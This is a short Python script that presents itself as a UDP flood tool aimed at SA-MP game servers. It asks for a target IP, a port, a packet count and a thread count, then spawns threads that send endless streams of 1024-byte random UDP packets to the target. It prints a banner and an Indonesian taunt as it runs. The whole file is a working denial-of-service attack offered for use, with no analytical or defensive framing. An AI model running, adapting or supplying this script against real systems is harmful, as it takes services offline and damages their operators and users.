# SXMP - A UDP-Flood script that made on purpose.
# Launches a attack to the SAMP connection client.
import random
import socket
import threading
print("""
  _ ______ __  __ ____   ____  ______ _______ ____  ______  _____ 
      | |  ____|  \/  |  _ \ / __ \|  ____|__   __/ __ \|  ____|/ ____|
      | | |__  | \  / | |_) | |  | | |__     | | | |  | | |__  | (___  
  _   | |  __| | |\/| |  _ <| |  | |  __|    | | | |  | |  __|  \___ \ 
 | |__| | |____| |  | | |_) | |__| | |____   | | | |__| | |____ ____) |
  \____/|______|_|  |_|____/ \____/|______|  |_|  \____/|______|_____/ 
                                                                       
""")

ip = str(input("> Enter IP : "))
port = int(input(">  Enter PORT : "))
times = int(input("> Connection packets : "))
threads = int(input("> Packets : "))

# Attack
def sxmp():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"J3MBOETOES :) MEMBERIKAN SENTUHAN KE IP {ip} DAN KE PORT {port}")
		except:
			print(f"J3MBOETOES :) MEMBERIKAN SENTUHAN KE IP {ip} DAN KE PORT {port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = sxmp)
	th.start()
